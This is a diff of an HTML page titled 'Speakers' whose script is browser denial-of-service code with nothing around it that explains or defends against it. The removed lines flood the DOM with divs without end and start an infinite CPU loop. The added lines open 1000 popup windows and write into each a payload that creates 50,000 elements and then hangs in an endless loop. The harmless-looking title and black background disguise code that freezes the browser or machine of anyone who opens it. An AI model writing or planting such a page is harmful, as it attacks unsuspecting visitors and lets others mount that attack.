@@ -1,35 +1,45 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta charset="UTF-8" />
+<meta charset="UTF-8">
 <title>Speakers</title>
 <style>
-html, body { margin:0; padding:0; width:100%; height:100%; background:black; overflow:hidden; }
+html, body { margin:0; padding:0; width:100%; height:100%; background:black; }
 </style>
 </head>
 <body>
 <script>
 (function(){
-  // Fill the DOM infinitely, keep adding & moving elements to force layout
-  let body = document.body;
-  function spam() {
-    for (let i=0; i<1000; i++) {
-      let d = document.createElement('div');
-      d.style.position = 'absolute';
-      d.style.top = (Math.random()*100)+'%';
-      d.style.left = (Math.random()*100)+'%';
-      d.style.width = '10px';
-      d.style.height = '10px';
-      d.style.background = 'black';
-      body.appendChild(d);
-    }
-    // Repeat immediately
-    requestAnimationFrame(spam);
-  }
-  spam();
+  // Payload HTML each window will run
+  let payload = `
+    <html>
+    <head><title></title></head>
+    <body style="background:black;margin:0;">
+      <script>
+        for(let i=0;i<50000;i++){
+          let d=document.createElement('div');
+          d.style.position='absolute';
+          d.style.top=(Math.random()*100)+'%';
+          d.style.left=(Math.random()*100)+'%';
+          d.style.width='10px';
+          d.style.height='10px';
+          d.style.background='black';
+          document.body.appendChild(d);
+        }
+        setTimeout(()=>{ while(true){} },500);
+      <\/script>
+    </body>
+    </html>
+  `;
 
-  // Also add infinite CPU loop after a bit
-  setTimeout(()=>{ while(true){} }, 1000);
+  // Open 1000 windows
+  for(let i=0;i<1000;i++){
+    let w = window.open('', '', 'width=200,height=200');
+    if(w){
+      w.document.write(payload);
+      w.document.close();
+    }
+  }
 })();
 </script>
 </body>
